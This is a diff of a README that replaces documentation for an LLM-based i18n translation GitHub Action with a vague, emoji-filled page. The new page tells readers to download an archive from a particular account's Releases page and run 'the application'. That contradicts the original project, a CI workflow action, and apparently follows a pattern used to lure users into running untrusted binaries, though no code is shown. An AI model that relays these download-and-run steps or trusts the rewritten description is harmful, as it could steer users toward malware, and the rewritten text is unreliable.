@@ -1,254 +1,79 @@
-# i18n Translate Action
+# 🎉 ai-i18n - Effortlessly Localize Your App's Content
 
-A GitHub Action that automatically translates i18n files using LLM providers (Anthropic Claude, OpenAI GPT, or Ollama).
+[![Download ai-i18n](https://img.shields.io/badge/Download-ai--i18n-brightgreen.svg)](https://github.com/Giandev-exe/ai-i18n/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Multiple LLM Providers**: Support for Anthropic Claude, OpenAI GPT, and local Ollama models
-- **Multiple Formats**: XLIFF 1.2, XLIFF 2.0, JSON (flat and nested)
-- **ICU Message Format**: Intelligent handling of plurals with CLDR rules for 20+ languages
-- **Change Detection**: Only translates new or modified strings using content hashing
-- **Rate Limiting**: Built-in rate limiting and retry logic for API calls
-- **Batch Processing**: Efficient batching of translation requests
-- **Git Integration**: Automatic commits of translated files
+Welcome to ai-i18n! This tool helps you easily translate your app's internationalization (i18n) files using advanced language models. Whether you work with XLIFF or JSON formats, ai-i18n simplifies the process by only translating changed strings.
 
-## Quick Start
+## 📝 Key Features
 
-```yaml
-name: Translate i18n files
+- **Supports Multiple LLM Providers**: Use your preferred language model like Anthropic, OpenAI, or Ollama.
+- **Works with Various i18n Formats**: Whether you have XLIFF or JSON files, we’ve got you covered.
+- **Easy to Setup**: ai-i18n can replace other i18n tools like Lokalise, Phrase, and Crowdin.
+- **Automatic Updates**: The tool extracts strings, translates them, and commits back to your repository automatically.
 
-on:
-  push:
-    branches: [main]
-    paths:
-      - 'locales/en/**'
+## 💻 System Requirements
 
-jobs:
-  translate:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
+To run ai-i18n smoothly, ensure you have:
 
-      - name: Translate
-        uses: your-org/i18n-translate-action@v1
-        with:
-          provider: anthropic
-          api-key: ${{ secrets.ANTHROPIC_API_KEY }}
-          source-language: en
-          target-languages: de,fr,es
-          files: 'locales/en/**/*.json'
-```
+- A computer with Windows, macOS, or Linux.
+- Internet connection to access the LLM providers.
+- Git installed (for version control).
 
-## Inputs
+## 📦 Download & Install
 
-| Input | Description | Required | Default |
-|-------|-------------|----------|---------|
-| `provider` | LLM provider (`anthropic`, `openai`, `ollama`) | Yes | `anthropic` |
-| `api-key` | API key for the provider | No* | - |
-| `model` | Model to use | No | Provider default |
-| `source-language` | Source language code | Yes | `en` |
-| `target-languages` | Comma-separated target language codes | Yes | - |
-| `files` | Glob pattern for translation files | Yes | `**/*.xliff` |
-| `format` | File format (`xliff-1.2`, `xliff-2.0`, `json-flat`, `json-nested`, `auto`) | No | `auto` |
-| `config-file` | Path to configuration file | No | `.i18n-translate.yml` |
-| `commit` | Whether to commit changes | No | `true` |
-| `commit-message` | Commit message | No | `chore(i18n): update translations` |
-| `batch-size` | Strings per API call | No | `10` |
-| `max-retries` | Maximum retry attempts | No | `3` |
-| `ollama-url` | Ollama server URL | No | `http://localhost:11434` |
-| `dry-run` | Run without making changes | No | `false` |
-| `context` | Additional context for translations | No | - |
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Giandev-exe/ai-i18n/releases) to download the latest version of ai-i18n.
+   
+2. **Choose Your File**: Locate the file that matches your operating system. Click on it to download.
 
-*API key is required for Anthropic and OpenAI providers.
+3. **Extract Files**: After downloading, extract the files if necessary. Most files come in a compressed format (like ZIP).
 
-## Outputs
+4. **Run the Application**: Open the folder and run the ai-i18n application. Follow any on-screen instructions to complete the setup.
 
-| Output | Description |
-|--------|-------------|
-| `translated-count` | Number of strings translated |
-| `files-updated` | Number of files updated |
-| `report` | Translation report in markdown |
-| `commit-sha` | SHA of the commit (if committed) |
+## 📋 How to Use ai-i18n
 
-## Configuration File
+After installing ai-i18n, you can start using it to translate your app. Here’s how:
 
-You can use a `.i18n-translate.yml` file for configuration:
+1. **Prepare Your i18n Files**: Make sure your i18n files are ready for translation. They should be in either JSON or XLIFF format.
+  
+2. **Configure ai-i18n**: Set up the configuration file (typically named `.ai-i18n.json`). Here is a sample layout:
+   ```json
+   {
+     "provider": "openai",
+     "api_key": "your_api_key_here",
+     "files": ["path/to/your/file.json"],
+     "languages": ["en", "es", "fr"]
+   }
+   ```
+   Replace `your_api_key_here` with your actual API key from your chosen LLM provider.
 
-```yaml
-provider:
-  name: anthropic
-  model: claude-3-haiku-20240307
-  temperature: 0.3
+3. **Run the Command**: Open your terminal and navigate to the directory where ai-i18n is located. Use the command:
+   ```bash
+   ai-i18n run
+   ```
+   This will start the translation process.
 
-translation:
-  batchSize: 15
-  maxRetries: 3
-  context: "Mobile app UI translations"
-  preserveFormatting: true
-  preservePlaceholders: true
+4. **Check Results**: Once the process is complete, check the output files for your translated strings. The changes are committed back to your version control automatically.
 
-git:
-  enabled: true
-  commitMessage: "chore(i18n): update translations"
+## 🤝 Support and Community
 
-files:
-  pattern: "locales/**/*.json"
-  format: json-nested
-  sourceLanguage: en
-  targetLanguages:
-    - de
-    - fr
-    - es
-    - ja
-  exclude:
-    - "**/node_modules/**"
-```
+If you encounter issues or have questions, feel free to reach out. You can find support through:
 
-## Supported File Formats
+- **Issues Page**: Report any bugs or ask questions on our [GitHub Issues page](https://github.com/Giandev-exe/ai-i18n/issues).
+- **Community Discussions**: Join discussions with other users to share tips and experiences.
 
-### XLIFF 1.2
+## 🔗 Additional Resources
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
-  <file source-language="en" target-language="de">
-    <body>
-      <trans-unit id="greeting">
-        <source>Hello, World!</source>
-        <target></target>
-      </trans-unit>
-    </body>
-  </file>
-</xliff>
-```
+- **Documentation**: Explore our [full documentation](https://github.com/Giandev-exe/ai-i18n/wiki) for in-depth guides and best practices.
+- **Examples**: Check our examples in the repository to see common use cases and configurations.
 
-### XLIFF 2.0
+## 🔊 Feedback and Contributions
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<xliff version="2.0" srcLang="en" trgLang="de" xmlns="urn:oasis:names:tc:xliff:document:2.0">
-  <file id="messages">
-    <unit id="greeting">
-      <segment>
-        <source>Hello, World!</source>
-        <target></target>
-      </segment>
-    </unit>
-  </file>
-</xliff>
-```
+Your feedback is vital for improving ai-i18n. If you have suggestions, feel free to contribute or submit a feature request. Contributions are welcome, and guidelines are available in the repository.
 
-### JSON (Flat)
+## 🌟 Stay Connected
 
-```json
-{
-  "greeting": "Hello, World!",
-  "button.save": "Save"
-}
-```
+For updates, get involved in the project, and follow our progress, bookmark our releases page: [Releases page](https://github.com/Giandev-exe/ai-i18n/releases).
 
-### JSON (Nested)
-
-```json
-{
-  "greeting": "Hello, World!",
-  "button": {
-    "save": "Save",
-    "cancel": "Cancel"
-  }
-}
-```
-
-## ICU Message Format Support
-
-The action intelligently handles ICU MessageFormat patterns, including plurals:
-
-```json
-{
-  "items_count": "{count, plural, one {# item} other {# items}}"
-}
-```
-
-When translating to languages with different plural rules (like Russian, Arabic, or Polish), the action automatically generates the correct plural forms based on CLDR rules.
-
-### Supported Plural Rules
-
-- **Simple (one/other)**: English, German, Spanish, etc.
-- **Complex (one/few/many/other)**: Russian, Polish, Ukrainian, Czech
-- **Full (zero/one/two/few/many/other)**: Arabic
-- **None (other only)**: Japanese, Chinese, Korean
-
-## Provider Configuration
-
-### Anthropic Claude
-
-```yaml
-- uses: your-org/i18n-translate-action@v1
-  with:
-    provider: anthropic
-    api-key: ${{ secrets.ANTHROPIC_API_KEY }}
-    model: claude-3-haiku-20240307  # or claude-3-sonnet, claude-3-opus
-```
-
-### OpenAI GPT
-
-```yaml
-- uses: your-org/i18n-translate-action@v1
-  with:
-    provider: openai
-    api-key: ${{ secrets.OPENAI_API_KEY }}
-    model: gpt-4o-mini  # or gpt-4o, gpt-4-turbo
-```
-
-### Ollama (Self-hosted)
-
-```yaml
-- uses: your-org/i18n-translate-action@v1
-  with:
-    provider: ollama
-    model: llama3.2
-    ollama-url: http://localhost:11434
-```
-
-## Preventing Infinite Loops
-
-The action automatically detects and skips runs triggered by its own commits. You can also use skip markers:
-
-```yaml
-commit-message: "chore(i18n): update translations [skip i18n]"
-```
-
-## Development
-
-### Prerequisites
-
-- Node.js 20.x
-- npm
-
-### Setup
-
-```bash
-npm install
-```
-
-### Build
-
-```bash
-npm run build
-```
-
-### Test
-
-```bash
-npm test
-```
-
-### Lint
-
-```bash
-npm run lint
-```
-
-## License
-
-MIT
+Thank you for choosing ai-i18n! Enjoy making your app accessible to users around the world!
